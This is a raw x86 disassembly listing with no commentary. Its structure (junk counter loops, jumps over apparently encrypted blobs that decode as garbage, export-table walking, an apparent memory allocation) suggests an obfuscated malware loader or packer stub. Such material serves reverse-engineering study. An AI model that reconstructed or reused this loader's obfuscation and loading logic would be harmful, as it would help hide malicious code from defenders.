  40afae:	movzx  edi,BYTE PTR ds:0x417e3d
  40afb5:	and    DWORD PTR ds:0x417e41,edi
  40afbb:	imul   edx,eax
  40afbe:	sub    DWORD PTR ds:0x412374,ecx
  40afc4:	mov    ecx,0x4573
  40afc9:	and    DWORD PTR ds:0x41abe2,0x0
  40afd3:	mov    esi,DWORD PTR ds:0x41abe2
  40afd9:	inc    esi
  40afda:	mov    DWORD PTR ds:0x41abe2,esi
  40afe0:	cmp    DWORD PTR ds:0x41abe2,0x22
  40afe7:	jne    0x40affd
  40afed:	push   0x2695
  40aff2:	push   0x8176
  40aff7:	call   DWORD PTR ds:0x40d3a0
  40affd:	cmp    DWORD PTR ds:0x41abe2,0x1e
  40b004:	jb     0x40afd3
  40b00a:	add    edx,ecx
  40b00c:	and    DWORD PTR ds:0x41abca,0x0
  40b016:	jmp    0x40b02a
  40b01b:	xor    edi,edi
  40b01d:	xor    edi,DWORD PTR ds:0x41abca
  40b023:	inc    edi
  40b024:	mov    DWORD PTR ds:0x41abca,edi
  40b02a:	cmp    DWORD PTR ds:0x41abca,0x12
  40b031:	jae    0x40b05b
  40b037:	cmp    DWORD PTR ds:0x41abca,0x1d
  40b03e:	jne    0x40b054
  40b044:	push   0x27af
  40b049:	push   0x17d7
  40b04e:	call   DWORD PTR ds:0x40d028
  40b054:	jmp    0x40b01b
  40b059:	or     esi,edi
  40b05b:	mov    esi,0x7879
  40b060:	mov    edi,0x1556
  40b065:	mov    DWORD PTR ds:0x4245b2,0x3a32
  40b06f:	xchg   esi,ecx
  40b071:	mov    ecx,DWORD PTR ds:0x41238c
  40b077:	mov    ecx,DWORD PTR [ecx]
  40b079:	or     DWORD PTR ds:0x417e49,ecx
  40b07f:	sub    edx,edi
  40b081:	and    ecx,DWORD PTR ds:0x412368
  40b087:	xor    esi,esi
  40b089:	adc    ecx,DWORD PTR ds:0x4245ae
  40b08f:	mov    DWORD PTR [ebp-0x28],esi
  40b092:	mov    DWORD PTR [ebp-0x2c],esi
  40b095:	add    ecx,DWORD PTR ds:0x41abd6
  40b09b:	mov    DWORD PTR [ebp-0x14],esi
  40b09e:	and    DWORD PTR ds:0x41510d,ebx
  40b0a4:	jmp    0x40b189
  40b0a9:	scas   al,BYTE PTR es:[edi]
  40b0aa:	mov    ch,0x8b
  40b0ac:	imul   edi,DWORD PTR [ecx+0x69],0x6e
  40b0b0:	pop    ecx
  40b0b1:	(bad)  
  40b0b2:	pusha  
  40b0b3:	fisttp WORD PTR [ecx-0xe]
  40b0b6:	mov    edx,0x3fc9f92d
  40b0bb:	jle    0x40b13b
  40b0bd:	mov    dh,0x7e
  40b0bf:	jle    0x40b13f
  40b0c1:	jae    0x40b069
  40b0c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0c4:	mov    ds:0xc766b0ad,eax
  40b0c9:	call   0x3511dd6b
  40b0ce:	iret   
  40b0cf:	outs   dx,BYTE PTR ds:[esi]
  40b0d0:	sbb    ch,BYTE PTR [ecx]
  40b0d2:	and    eax,esp
  40b0d4:	pop    edx
  40b0d5:	loop   0x40b06c
  40b0d7:	loopne 0x40b0d1
  40b0d9:	sub    esp,ebx
  40b0db:	push   ecx
  40b0dc:	inc    esi
  40b0dd:	and    cl,BYTE PTR [edx]
  40b0df:	jge    0x40b135
  40b0e1:	out    0x63,eax
  40b0e3:	dec    esi
  40b0e4:	das    
  40b0e5:	mov    esp,0x35c84bcb
  40b0ea:	bound  ecx,QWORD PTR ds:0x48cf00ee
  40b0f0:	mov    ebp,0xaa9c491b
  40b0f5:	xlat   BYTE PTR ds:[ebx]
  40b0f6:	cmp    al,0x8d
  40b0f8:	mov    dh,0x21
  40b0fa:	fldenv [ebx-0x6e18d2e3]
  40b100:	ja     0x40b085
  40b102:	mov    esp,0x62ffebfe
  40b107:	mov    ss,WORD PTR [esi-0x60d9f889]
  40b10d:	clc    
  40b10e:	arpl   WORD PTR [ebx-0x27],bp
  40b111:	ss ins DWORD PTR es:[edi],dx
  40b113:	sub    DWORD PTR [ebx+ecx*1],edi
  40b116:	test   DWORD PTR [esi+0x38],edi
  40b119:	pop    ebx
  40b11a:	mov    BYTE PTR [edi],cl
  40b11c:	pusha  
  40b11d:	cld    
  40b11e:	imul   eax,DWORD PTR [edx+0x18],0xffffffe0
  40b122:	cld    
  40b123:	clc    
  40b124:	lds    edx,FWORD PTR [edi-0x78]
  40b127:	popf   
  40b128:	into   
  40b129:	fidiv  WORD PTR ds:0x291c534e
  40b12f:	ret    
  40b130:	xlat   BYTE PTR ds:[ebx]
  40b131:	sahf   
  40b132:	pop    edx
  40b133:	pop    es
  40b134:	sub    al,0x45
  40b136:	mov    ds:0xe4045b39,eax
  40b13b:	dec    ebx
  40b13c:	or     DWORD PTR [ecx-0x7c],0x4945bde4
  40b143:	lods   eax,DWORD PTR ds:[esi]
  40b144:	or     bh,cl
  40b146:	cmp    ch,bh
  40b148:	mov    eax,0x4f6448ab
  40b14d:	(bad)  
  40b14f:	inc    ecx
  40b150:	jbe    0x40b17e
  40b152:	mov    ds:0x9f136be2,eax
  40b157:	(bad)  
  40b158:	push   0xffffff8f
  40b15a:	push   es
  40b15b:	ret    
  40b15c:	add    dh,BYTE PTR [ebx]
  40b15e:	jmp    0xfb89:0xfb887bba
  40b165:	scas   al,BYTE PTR es:[edi]
  40b166:	adc    eax,0x2622a03f
  40b16b:	bound  esi,QWORD PTR [edi]
  40b16d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b16e:	jge    0x40b1d8
  40b170:	idiv   BYTE PTR [esi+0xa]
  40b173:	(bad)  
  40b174:	mov    fs:0xdaf20f65,al
  40b17a:	fwait
  40b17b:	inc    esi
  40b17c:	push   ecx
  40b17d:	inc    eax
  40b17e:	dec    edx
  40b17f:	ficom  WORD PTR [ebx-0x75]
  40b182:	imul   ebp,DWORD PTR [edi+edx*2-0x43ba5542],0xff87589
  40b18d:	mov    dh,0xd
  40b18f:	into   
  40b190:	stos   DWORD PTR es:[edi],eax
  40b191:	inc    ecx
  40b192:	add    BYTE PTR [ecx],ah
  40b194:	or     eax,0x415115
  40b199:	jmp    0x40b27e
  40b19e:	mov    ebp,0xc5aa0686
  40b1a3:	stos   BYTE PTR es:[edi],al
  40b1a4:	popa   
  40b1a5:	jns    0x40b1e6
  40b1a7:	in     eax,dx
  40b1a8:	(bad)  
  40b1a9:	mov    ah,0xdd
  40b1ab:	shl    esi,1
  40b1ad:	or     DWORD PTR [ecx],eax
  40b1af:	cmp    al,0x7e
  40b1b1:	jle    0x40b169
  40b1b3:	jle    0x40b233
  40b1b5:	jle    0x40b20e
  40b1b7:	iret   
  40b1b8:	xor    bl,BYTE PTR [edi-0x9]
  40b1bb:	pop    ecx
  40b1bc:	imul   esp,ecx,0xc4a16a25
  40b1c2:	jge    0x40b1be
  40b1c4:	in     al,dx
  40b1c5:	xlat   BYTE PTR ds:[ebx]
  40b1c6:	pop    eax
  40b1c7:	js     0x40b151
  40b1c9:	popa   
  40b1ca:	cld    
  40b1cb:	je     0x40b1cb
  40b1cd:	nop
  40b1ce:	call   0x8b0a36e0
  40b1d3:	lock xor edi,DWORD PTR [edi+eax*2-0x4171ba24]
  40b1db:	std    
  40b1dc:	stos   BYTE PTR es:[edi],al
  40b1dd:	add    BYTE PTR [edx],bh
  40b1df:	push   ecx
  40b1e0:	pop    ebp
  40b1e1:	mov    esp,DWORD PTR [ebx]
  40b1e3:	sbb    BYTE PTR [ebx-0x6c],0x80
  40b1e7:	xor    eax,0x5fb549cb
  40b1ec:	push   edi
  40b1ed:	arpl   sp,cx
  40b1ef:	aad    0x61
  40b1f1:	fs inc esi
  40b1f3:	jns    0x40b242
  40b1f5:	loope  0x40b250
  40b1f7:	or     al,0x3a
  40b1f9:	dec    eax
  40b1fa:	ficom  WORD PTR [ebx]
  40b1fc:	xor    eax,DWORD PTR [esi-0x17]
  40b1ff:	adc    BYTE PTR [edi],0x75
  40b202:	mov    DWORD PTR [edx-0x54],ecx
  40b205:	fnstenv [ebx+0x15]
  40b208:	dec    ecx
  40b209:	aas    
  40b20a:	mov    ebx,0x107e7ac9
  40b20f:	jg     0x40b195
  40b211:	in     eax,dx
  40b212:	rcr    DWORD PTR [eax+0x7d25c2f5],1
  40b218:	sub    BYTE PTR [esi+edi*1+0x457402cc],dl
  40b21f:	lods   al,BYTE PTR ds:[esi]
  40b220:	xchg   edx,eax
  40b221:	popf   
  40b222:	enter  0xf96d,0xf5
  40b226:	ins    DWORD PTR es:[edi],dx
  40b227:	dec    ebx
  40b228:	pop    ds
  40b229:	popa   
  40b22a:	(bad)  
  40b22b:	cmp    al,0x57
  40b22d:	(bad)  
  40b22e:	fisttp QWORD PTR [edx]
  40b230:	out    0xbf,al
  40b232:	or     eax,0xf33677d2
  40b237:	loope  0x40b29f
  40b239:	pop    esi
  40b23b:	leave  
  40b23c:	jbe    0x40b1fb
  40b23e:	push   eax
  40b23f:	inc    ebx
  40b240:	and    edx,DWORD PTR [ebp-0x2b924026]
  40b246:	cmp    al,0x70
  40b248:	jl     0x40b1fd
  40b24a:	fs jl  0x40b28b
  40b24d:	push   ecx
  40b24e:	lock mov eax,ds:0x418900ea
  40b254:	dec    ebp
  40b255:	ficom  WORD PTR [eax+0x57840e99]
  40b25b:	mov    esp,0x4acd9f2e
  40b260:	test   al,0xd
  40b262:	xchg   edx,eax
  40b263:	les    esi,FWORD PTR [edi]
  40b265:	push   esp
  40b266:	jg     0x40b25a
  40b268:	outs   dx,DWORD PTR ds:[esi]
  40b269:	mov    dl,0x84
  40b26b:	shl    DWORD PTR [ebx-0x1da4e060],1
  40b271:	inc    edi
  40b272:	xor    ebx,DWORD PTR [esi-0x5e]
  40b275:	jge    0x40b212
  40b277:	fistp  QWORD PTR [ebp+0x53de3ecb]
  40b27d:	sub    eax,0x81e84d8b
  40b282:	sub    eax,0x4150fd
  40b287:	fisubr DWORD PTR [ebx-0x37ccffbf]
  40b28d:	xor    edi,edi
  40b28f:	or     DWORD PTR ds:0x41236c,edi
  40b295:	add    ecx,ebx
  40b297:	not    eax
  40b299:	mov    DWORD PTR [ebp-0x20],ecx
  40b29c:	mov    eax,DWORD PTR [ebp-0x20]
  40b29f:	je     0x40bb71
  40b2a5:	mov    eax,ds:0x415105
  40b2aa:	xor    DWORD PTR ds:0x412354,eax
  40b2b0:	mov    eax,DWORD PTR [ebp-0x4]
  40b2b3:	xor    eax,0x7510859
  40b2b8:	and    DWORD PTR ds:0x4245ae,0x412358
  40b2c2:	add    eax,ebx
  40b2c4:	mov    DWORD PTR ds:0x4245ae,0x20c7
  40b2ce:	cmp    edi,eax
  40b2d0:	jmp    0x40b3b5
  40b2d5:	push   edi
  40b2d6:	pop    es
  40b2d7:	popf   
  40b2d8:	aam    0x6d
  40b2da:	fs push edi
  40b2dc:	test   DWORD PTR [edx-0x4d19a5cd],edx
  40b2e2:	xchg   edx,eax
  40b2e3:	int3   
  40b2e4:	jbe    0x40b33f
  40b2e6:	cmp    al,0x7e
  40b2e8:	jle    0x40b2a0
  40b2ea:	jle    0x40b36a
  40b2ec:	jle    0x40b2c0
  40b2ee:	mov    edx,DWORD PTR [edi-0x681e2506]
  40b2f4:	retf   0x41bf
  40b2f7:	sbb    BYTE PTR [eax+ecx*8+0x2],cl
  40b2fb:	rcl    DWORD PTR [ebx-0x51db1d97],1
  40b301:	mov    dh,0x58
  40b303:	and    esp,DWORD PTR [edi]
  40b305:	add    eax,0x990fe09e
  40b30a:	or     BYTE PTR [edi+0x13],0xc9
  40b30e:	out    0x60,al
  40b310:	dec    esi
  40b311:	retf   0x7913
  40b314:	push   ds
  40b315:	sbb    al,0xa8
  40b317:	sbb    BYTE PTR [edx+0x3b],ch
  40b31a:	cmp    BYTE PTR [edi],ch
  40b31c:	push   esi
  40b31d:	(bad)  
  40b31e:	(bad)  
  40b320:	push   esp
  40b321:	mov    ebp,0xaa4ff336
  40b326:	jmp    0x40b376
  40b328:	(bad)  [eax]
  40b32a:	les    edi,FWORD PTR [esi-0xc50819f]
  40b330:	je     0x40b2ee
  40b332:	lahf   
  40b333:	and    ebp,ebp
  40b335:	mov    ds:0xd131f0c0,al
  40b33a:	sub    BYTE PTR [ebp-0x46],ah
  40b33d:	and    edi,DWORD PTR [ebp-0x6c]
  40b340:	cmp    edi,edx
  40b342:	inc    eax
  40b343:	sar    DWORD PTR [ebp+ecx*4+0x10],0x23
  40b348:	push   ebp
  40b349:	add    BYTE PTR [esi-0x4f],cl
  40b34c:	sbb    DWORD PTR [ecx+0x68],0xffffff85
  40b350:	jp     0x40b37b
  40b352:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b353:	pop    edi
  40b354:	mov    esp,0x2575f593
  40b359:	ror    BYTE PTR [edx-0x43c2abd2],1
  40b35f:	ror    ecx,0xba
  40b362:	mov    esp,0xd6dcefd7
  40b367:	push   edx
  40b368:	xor    BYTE PTR [ebx],ch
  40b36a:	aad    0xcb
  40b36c:	cli    
  40b36d:	imul   al
  40b36f:	and    DWORD PTR [esi-0x37],esi
  40b372:	pop    edx
  40b373:	adc    eax,DWORD PTR [eax+0x3b4d15f4]
  40b379:	out    0x20,eax
  40b37b:	lods   eax,DWORD PTR ds:[esi]
  40b37c:	and    BYTE PTR ds:0xf53eb814,0x7d
  40b383:	cwde   
  40b384:	sar    DWORD PTR gs:[eax],0x5b
  40b388:	scas   al,BYTE PTR es:[edi]
  40b389:	rol    BYTE PTR [ebx-0x6aee0669],0x69
  40b390:	mov    ecx,0x593d929e
  40b395:	mov    al,ds:0xe6c95d15
  40b39a:	mov    al,ds:0x76513b98
  40b39f:	cwde   
  40b3a0:	sub    eax,0x4ee0deba
  40b3a5:	xchg   esi,eax
  40b3a6:	dec    ebx
  40b3a7:	cs ret 
  40b3a9:	cmc    
  40b3aa:	scas   eax,DWORD PTR es:[edi]
  40b3ab:	rcr    DWORD PTR [edi-0x15],1
  40b3ae:	dec    edx
  40b3af:	gs cdq 
  40b3b1:	xlat   BYTE PTR ds:[ebx]
  40b3b2:	(bad)
  40b3b6:	test   DWORD PTR [edi-0xfffffb],ecx
  40b3bc:	jne    0x40b3c6
  40b3be:	mov    DWORD PTR ds:0x41abe2,0x7935
  40b3c8:	call   0x40a5e1
  40b3cd:	and    DWORD PTR ds:0x41237c,0x0
  40b3d7:	jmp    0x40b3eb
  40b3dc:	xor    ecx,ecx
  40b3de:	add    ecx,DWORD PTR ds:0x41237c
  40b3e4:	inc    ecx
  40b3e5:	mov    DWORD PTR ds:0x41237c,ecx
  40b3eb:	cmp    DWORD PTR ds:0x41237c,0x18
  40b3f2:	jae    0x40b452
  40b3f8:	cmp    DWORD PTR ds:0x41237c,0x24
  40b3ff:	jne    0x40b40e
  40b405:	push   DWORD PTR [ebp-0x14]
  40b408:	call   DWORD PTR ds:0x40d02c
  40b40e:	jmp    0x40b3dc
  40b413:	mov    DWORD PTR ds:0x415101,0x17
  40b41d:	cmp    DWORD PTR ds:0x415101,0x0
  40b424:	je     0x40b452
  40b42a:	cmp    DWORD PTR ds:0x415101,0x1d
  40b431:	jne    0x40b440
  40b437:	push   DWORD PTR [ebp-0xc]
  40b43a:	call   DWORD PTR ds:0x40d3a4
  40b440:	mov    esi,DWORD PTR ds:0x415101
  40b446:	dec    esi
  40b447:	mov    DWORD PTR ds:0x415101,esi
  40b44d:	jmp    0x40b41d
  40b452:	mov    DWORD PTR [ebp-0x20],eax
  40b455:	and    DWORD PTR ds:0x4245c2,0x0
  40b45f:	mov    eax,ds:0x4245c2
  40b464:	inc    eax
  40b465:	mov    ds:0x4245c2,eax
  40b46a:	cmp    DWORD PTR ds:0x4245c2,0x6
  40b471:	jne    0x40b485
  40b477:	push   DWORD PTR [ebp-0x10]
  40b47a:	push   0x41ad5b
  40b47f:	call   DWORD PTR ds:0x40d20c
  40b485:	cmp    DWORD PTR ds:0x4245c2,0x5
  40b48c:	jne    0x40b4a0
  40b492:	xor    eax,eax
  40b494:	or     eax,DWORD PTR ds:0x4245c2
  40b49a:	inc    eax
  40b49b:	mov    ds:0x4245c2,eax
  40b4a0:	cmp    DWORD PTR ds:0x4245c2,0x15
  40b4a7:	jb     0x40b45f
  40b4ad:	mov    DWORD PTR ds:0x41abca,0x15
  40b4b7:	cmp    DWORD PTR ds:0x41abca,0x0
  40b4be:	je     0x40b50b
  40b4c4:	cmp    DWORD PTR ds:0x41abca,0x22
  40b4cb:	jne    0x40b4f1
  40b4d1:	push   DWORD PTR [ebp-0x14]
  40b4d4:	push   DWORD PTR [ebp-0xc]
  40b4d7:	push   DWORD PTR [ebp-0x18]
  40b4da:	push   DWORD PTR [ebp-0x14]
  40b4dd:	push   DWORD PTR [ebp-0x1c]
  40b4e0:	push   DWORD PTR [ebp-0x1c]
  40b4e3:	push   0x15ca
  40b4e8:	push   DWORD PTR [ebp-0x28]
  40b4eb:	call   DWORD PTR ds:0x40d030
  40b4f1:	xor    ecx,ecx
  40b4f3:	or     ecx,DWORD PTR ds:0x41abca
  40b4f9:	dec    ecx
  40b4fa:	mov    DWORD PTR ds:0x41abca,ecx
  40b500:	jmp    0x40b4b7
  40b505:	sbb    DWORD PTR ds:0x41abd6,edi
  40b50b:	mov    eax,DWORD PTR [ebp-0x4]
  40b50e:	mov    ecx,DWORD PTR [ebp-0x20]
  40b511:	not    esi
  40b513:	mov    esi,0x7510859
  40b518:	xor    eax,esi
  40b51a:	sub    DWORD PTR ds:0x4245b6,0x7cc8
  40b524:	add    eax,ebx
  40b526:	cmp    ecx,eax
  40b528:	jmp    0x40b60d
  40b52d:	add    edi,ebx
  40b52f:	or     al,0xde
  40b531:	in     al,0xe9
  40b533:	loope  0x40b530
  40b535:	js     0x40b579
  40b537:	dec    ebp
  40b538:	inc    edi
  40b539:	xchg   edx,eax
  40b53a:	ss sub esi,ebp
  40b53d:	xchg   ecx,eax
  40b53e:	cmp    eax,0x7eb67e7e
  40b543:	jle    0x40b5c3
  40b545:	lds    esi,FWORD PTR [esi]
  40b547:	cmp    edx,ebx
  40b549:	xor    ch,BYTE PTR [edx+0x1]
  40b54c:	mov    DWORD PTR [edx-0x4],esp
  40b54f:	ins    DWORD PTR es:[edi],dx
  40b550:	call   0xe2e4:0x7ab77c4a
  40b557:	add    al,0x19
  40b559:	sti    
  40b55a:	cmp    eax,0x4aa2856f
  40b55f:	in     al,dx
  40b560:	arpl   di,si
  40b562:	push   esi
  40b563:	cmp    bl,ch
  40b565:	and    dh,ch
  40b567:	cmc    
  40b568:	mov    WORD PTR [esi-0x4f],gs
  40b56b:	or     al,0x54
  40b56d:	sbb    eax,0xa7ef611f
  40b572:	adc    bl,BYTE PTR [ebx+0x37]
  40b575:	sub    bh,BYTE PTR [ebp+0x14]
  40b578:	xchg   ebp,eax
  40b579:	out    0x7c,al
  40b57b:	mov    eax,0x4b56b929
  40b580:	mov    DWORD PTR [edi-0x1bbb64c1],esi
  40b586:	(bad)  
  40b587:	aam    0x34
  40b589:	xchg   edx,eax
  40b58a:	push   esp
  40b58b:	or     DWORD PTR [eax-0x7c72ee0f],esp
  40b591:	mov    ds:0x6d4af11b,al
  40b596:	rcl    DWORD PTR [esi],0xe2
  40b599:	add    cl,BYTE PTR [esi-0x75]
  40b59c:	push   edi
  40b59d:	inc    ebx
  40b59e:	sub    bh,BYTE PTR [ebp+0x29]
  40b5a1:	int3   
  40b5a2:	fdiv   QWORD PTR [edi+0x4c]
  40b5a5:	or     BYTE PTR [edi],bh
  40b5a7:	xor    esp,ecx
  40b5a9:	add    eax,0x320dbec4
  40b5ae:	push   0xffffff8b
  40b5b0:	loope  0x40b586
  40b5b2:	aam    0x4e
  40b5b4:	out    0x7d,eax
  40b5b6:	xchg   edx,eax
  40b5b7:	add    DWORD PTR [esp+edi*2],0xd96515bf
  40b5be:	in     al,dx
  40b5bf:	push   edi
  40b5c0:	pop    ebp
  40b5c1:	cmovge esi,DWORD PTR [edi+0x29]
  40b5c5:	push   edi
  40b5c6:	push   esp
  40b5c7:	ficomp DWORD PTR ds:0xe1a9c78c
  40b5cd:	pop    edi
  40b5ce:	bound  edi,QWORD PTR [esi+0x272e0716]
  40b5d4:	adc    dh,BYTE PTR [ecx]
  40b5d6:	xchg   ecx,eax
  40b5d7:	imul   ebp,DWORD PTR [ecx+ebx*8+0x4ec89262],0xffffffef
  40b5df:	jne    0x40b621
  40b5e1:	js     0x40b608
  40b5e3:	sbb    bh,BYTE PTR [ebp+0x5a58afe0]
  40b5e9:	cmp    DWORD PTR [ebp-0x5002ae08],ecx
  40b5ef:	adc    BYTE PTR [edx+0x12f4d1af],cl
  40b5f5:	sbb    BYTE PTR [edi],dl
  40b5f7:	scas   eax,DWORD PTR es:[edi]
  40b5f8:	aaa    
  40b5f9:	mov    al,ds:0x36427ab9
  40b5fe:	inc    edi
  40b5ff:	jp     0x40b60d
  40b601:	call   0x86e:0x57272e9d
  40b608:	popa   
  40b609:	push   es
  40b60a:	push   edi
  40b60b:	mov    edi,0x42840fed
  40b610:	add    eax,0x1d810000
  40b615:	adc    eax,0x68004151
  40b61a:	and    eax,DWORD PTR [ecx+0x0]
  40b61d:	push   DWORD PTR [ebp-0x20]
  40b620:	jmp    0x40b705
  40b625:	sti    
  40b626:	loopne 0x40b67d
  40b628:	lock push ebp
  40b62a:	cdq    
  40b62b:	sti    
  40b62c:	jns    0x40b666
  40b62e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b62f:	pop    ecx
  40b630:	out    0x44,al
  40b632:	dec    ebp
  40b633:	cmp    BYTE PTR [esi],dh
  40b635:	jmp    0xb6bf346c
  40b63a:	jle    0x40b6ba
  40b63c:	jle    0x40b69e
  40b63e:	jmp    0x1507acf0
  40b643:	push   esp
  40b644:	loope  0x40b65a
  40b646:	test   BYTE PTR [eax],0xf3
  40b649:	dec    edi
  40b64a:	in     eax,0x96
  40b64c:	cmp    eax,0x316af81a
  40b651:	imul   esp,DWORD PTR [edi-0x75],0x1
  40b655:	xor    eax,0x59792069
  40b65a:	mov    edx,0x4e271ba0
  40b65f:	mov    eax,0xad7103e5
  40b664:	(bad)  [ebp-0x21b988aa]
  40b66a:	pop    ss
  40b66b:	imul   edx,DWORD PTR ds:0x2229ebf2,0x46
  40b672:	stos   DWORD PTR es:[edi],eax
  40b673:	xor    dh,0xb8
  40b676:	xchg   esi,esi
  40b678:	shl    BYTE PTR [ebp*4+0x5235a5f1],cl
  40b67f:	(bad)  
  40b680:	xchg   ebx,eax
  40b681:	push   esp
  40b682:	mov    ebp,0xbd03b10
  40b687:	sbb    bh,BYTE PTR [edi+0x32322eb8]
  40b68d:	das    
  40b68e:	arpl   WORD PTR ds:0x6619,dx
  40b693:	cmp    al,0x8
  40b695:	mov    ah,0x9a
  40b697:	fwait
  40b698:	mov    ecx,0x89c79057
  40b69d:	and    ecx,esp
  40b69f:	adc    al,0x3b
  40b6a1:	ins    DWORD PTR es:[edi],dx
  40b6a2:	(bad)  
  40b6a3:	icebp  
  40b6a4:	dec    esp
  40b6a5:	out    0xfa,al
  40b6a7:	pop    ss
  40b6a8:	cld    
  40b6a9:	mov    al,ds:0xe2b7abaf
  40b6ae:	cmp    DWORD PTR [ebx+ebx*4+0x52388653],ecx
  40b6b5:	mov    edx,0xac8557f5
  40b6ba:	hlt    
  40b6bb:	arpl   WORD PTR [eax],ax
  40b6bd:	push   eax
  40b6be:	rol    BYTE PTR [ecx-0x196d24db],0x1f
  40b6c5:	stc    
  40b6c6:	mov    WORD PTR [ecx+0x32c56012],?
  40b6cc:	shl    DWORD PTR [edi],0x55
  40b6cf:	fdivr  QWORD PTR [ecx-0x39163c1]
  40b6d5:	jne    0x40b6f6
  40b6d7:	pop    ds
  40b6d8:	popa   
  40b6d9:	ss ret 0x767e
  40b6dd:	cmp    bh,ch
  40b6df:	ss mov esp,0xc7bfa19e
  40b6e5:	xchg   DWORD PTR [edx+eiz*8],esi
  40b6e8:	shr    DWORD PTR [esi-0x2a],cl
  40b6eb:	fisubr WORD PTR [bp+di-0x28]
  40b6ef:	push   es
  40b6f0:	loop   0x40b710
  40b6f2:	ret    0xf325
  40b6f5:	or     al,0xbc
  40b6f7:	std    
  40b6f8:	or     DWORD PTR ss:[esi],ecx
  40b6fb:	out    0xab,al
  40b6fd:	imul   esi,DWORD PTR [ebx],0x2e
  40b700:	loope  0x40b734
  40b702:	push   ebp
  40b703:	push   ebp
  40b704:	repnz push DWORD PTR [ebp+0x8]
  40b708:	call   0x40a6ca
  40b70d:	or     DWORD PTR ds:0x41abde,edi
  40b713:	mov    DWORD PTR [ebp-0x14],eax
  40b716:	mov    eax,DWORD PTR [ebp-0x4]
  40b719:	adc    ecx,DWORD PTR ds:0x412370
  40b71f:	mov    ecx,DWORD PTR [ebp-0x14]
  40b722:	adc    DWORD PTR ds:0x4245ba,0x45e4
  40b72c:	xor    eax,esi
  40b72e:	add    eax,ebx
  40b730:	mov    DWORD PTR ds:0x415111,0x202e
  40b73a:	cmp    ecx,eax
  40b73c:	mov    DWORD PTR ds:0x412364,0x4412
  40b746:	je     0x40bb55
  40b74c:	and    DWORD PTR ds:0x417e49,0x0
  40b756:	mov    eax,ds:0x417e49
  40b75b:	inc    eax
  40b75c:	mov    ds:0x417e49,eax
  40b761:	cmp    DWORD PTR ds:0x417e49,0x22
  40b768:	jne    0x40b798
  40b76e:	push   0x415115
  40b773:	push   0x2bf6
  40b778:	push   DWORD PTR [ebp-0x14]
  40b77b:	push   0x415111
  40b780:	push   DWORD PTR [ebp-0x10]
  40b783:	push   0x41adfd
  40b788:	push   0x4def
  40b78d:	push   0x3000
  40b792:	call   DWORD PTR ds:0x40d210
  40b798:	cmp    DWORD PTR ds:0x417e49,0x12
  40b79f:	jb     0x40b756
  40b7a5:	mov    eax,DWORD PTR [ebp-0x14]
  40b7a8:	mov    eax,DWORD PTR [eax+0x18]
  40b7ab:	movzx  ecx,BYTE PTR ds:0x417e4d
  40b7b2:	sbb    DWORD PTR ds:0x41237c,ecx
  40b7b8:	mov    DWORD PTR [ebp-0x20],eax
  40b7bb:	xor    eax,eax
  40b7bd:	or     eax,DWORD PTR ds:0x412390
  40b7c3:	xor    ecx,ecx
  40b7c5:	xor    ecx,DWORD PTR ds:0x417eaa
  40b7cb:	sub    ecx,eax
  40b7cd:	sub    eax,DWORD PTR [eax+ecx*1]
  40b7d0:	mov    eax,DWORD PTR [ebp-0x14]
  40b7d3:	sub    DWORD PTR ds:0x4245b6,0x1830
  40b7dd:	mov    ecx,DWORD PTR [ebp+0x8]
  40b7e0:	add    DWORD PTR ds:0x41235c,0x415101
  40b7ea:	add    ecx,DWORD PTR [eax+0x20]
  40b7ed:	mov    DWORD PTR [ebp-0x28],ecx
  40b7f0:	mov    DWORD PTR ds:0x417e59,0x1f
  40b7fa:	cmp    DWORD PTR ds:0x417e59,0x0
  40b801:	je     0x40b84b
  40b807:	cmp    DWORD PTR ds:0x417e59,0xf
  40b80e:	jne    0x40b823
  40b814:	push   DWORD PTR [ebp-0x1c]
  40b817:	push   DWORD PTR [ebp-0x10]
  40b81a:	push   DWORD PTR [ebp-0x28]
  40b81d:	call   DWORD PTR ds:0x40d034
  40b823:	cmp    DWORD PTR ds:0x417e59,0x10
  40b82a:	jne    0x40b83b
  40b830:	mov    eax,ds:0x417e59
  40b835:	dec    eax
  40b836:	mov    ds:0x417e59,eax
  40b83b:	mov    eax,ds:0x417e59
  40b840:	dec    eax
  40b841:	mov    ds:0x417e59,eax
  40b846:	jmp    0x40b7fa
  40b84b:	mov    eax,DWORD PTR [ebp-0x14]
  40b84e:	mov    ecx,DWORD PTR [ebp+0x8]
  40b851:	add    ecx,DWORD PTR [eax+0x24]
  40b854:	jmp    0x40b939
  40b859:	mov    ch,0x76
  40b85b:	or     DWORD PTR [ecx+ecx*2+0x59],eax
  40b85f:	pop    ecx
  40b860:	pop    es
  40b861:	aas    
  40b862:	mov    edx,0xdec823e6
  40b867:	mov    esp,esp
  40b869:	and    DWORD PTR [ebx],esi
  40b86b:	jle    0x40b8eb
  40b86d:	mov    dh,0x7e
  40b86f:	jle    0x40b8ef
  40b871:	shr    eax,0x5f
  40b874:	xchg   esp,eax
  40b875:	cmc    
  40b876:	or     al,BYTE PTR [ebp+0x37]
  40b879:	cdq    
  40b87a:	call   0xe63f:0xf9fcdcf8
  40b881:	stos   BYTE PTR es:[edi],al
  40b882:	repz sub BYTE PTR [ecx-0x39633d1f],0xb6
  40b88a:	or     BYTE PTR [eax-0x4dd28d50],cl
  40b890:	frstor [eax+0x1c]
  40b893:	bound  ebx,QWORD PTR [eax+0x56]
  40b896:	popaw  
  40b898:	xchg   BYTE PTR ds:0xce915e4e,bh
  40b89e:	adc    eax,0x1679cc36
  40b8a3:	lea    edi,[ebp+0x6f8ca4f8]
  40b8a9:	jnp    0x40b864
  40b8ab:	pop    ebx
  40b8ac:	cs icebp 
  40b8ae:	mov    al,0x89
  40b8b0:	in     al,0xd2
  40b8b2:	cmp    DWORD PTR [ecx+0x3a],ecx
  40b8b5:	pop    esi
  40b8b6:	daa    
  40b8b7:	or     ebp,ebp
  40b8b9:	test   eax,0x482a9b33
  40b8be:	retf   
  40b8bf:	nop
  40b8c0:	fcmovnbe st,st(0)
  40b8c2:	sbb    ecx,ebx
  40b8c4:	fdivr  st,st(4)
  40b8c6:	loop   0x40b853
  40b8c8:	push   0xf12d78a4
  40b8cd:	xor    ch,al
  40b8cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8d0:	adc    BYTE PTR [ecx],cl
  40b8d2:	adc    eax,0xb5072e0a
  40b8d7:	jns    0x40b85b
  40b8d9:	shl    esp,1
  40b8db:	or     eax,0x19f9c7f8
